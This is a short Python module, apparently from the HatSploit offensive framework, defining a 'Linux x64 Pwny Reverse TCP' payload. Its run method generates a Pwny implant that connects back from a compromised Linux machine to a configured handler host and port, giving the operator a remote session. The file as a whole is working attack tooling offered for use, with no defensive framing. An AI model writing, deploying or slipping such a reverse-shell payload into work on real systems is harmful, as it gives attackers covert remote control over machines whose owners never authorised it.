#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from pwny import Pwny
from pwny.session import PwnySession

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload, Pwny):
    details = {
        'Name': "Linux x64 Pwny Reverse TCP",
        'Payload': "linux/x64/pwny_reverse_tcp",
        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
        'Description': "Pwny reverse TCP payload for Linux x64.",
        'Architecture': "x64",
        'Platform': "linux",
        'Session': PwnySession,
        'Rank': "high",
        'Type': "reverse_tcp",
    }

    def run(self):
        return self.get_pwny(
            self.details['Platform'],
            self.details['Architecture'],
            self.handler['RHOST'],
            self.handler['RPORT'],
        )
